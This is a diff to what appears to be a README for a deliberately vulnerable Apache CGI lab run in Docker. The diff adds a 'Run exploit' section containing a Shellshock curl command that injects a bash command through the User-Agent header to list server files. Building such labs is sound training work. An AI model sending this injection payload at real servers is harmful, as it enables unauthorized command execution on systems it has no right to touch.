@@ -45,4 +45,9 @@ services:
     - Copy httpd.conf to the apache2/conf directory
     - Copy the HTML file with the framed shell script to the htdocs or /var/www/html directory
     - Set the shell script as executable using chmod and place it in the cgi-bin directory
-5. Create a Docker-Compose file to build the container and expose the desired port on the host to the container's port 80. 
+5. Create a Docker-Compose file to build the container and expose the desired port on the host to the container's port 80.
+
+### Run exploit:
+```
+curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'ls ../htdocs;'" http://<ip address>/cgi-bin/toucan
+```
